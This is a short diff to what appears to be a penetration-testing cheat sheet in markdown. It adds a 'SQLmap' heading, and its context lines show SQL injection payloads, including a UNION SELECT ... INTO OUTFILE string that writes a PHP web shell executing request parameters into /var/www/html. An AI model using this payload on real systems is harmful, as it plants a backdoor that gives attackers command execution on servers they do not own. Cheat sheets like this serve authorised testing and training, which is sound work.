@@ -329,6 +329,8 @@ zoomeye
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
 
+## SQLmap
+
 | **Command**                                                  | **Description**                                             |
 | ------------------------------------------------------------ | ----------------------------------------------------------- |
 | `sqlmap -h`                                                  | View the basic help menu                                    |
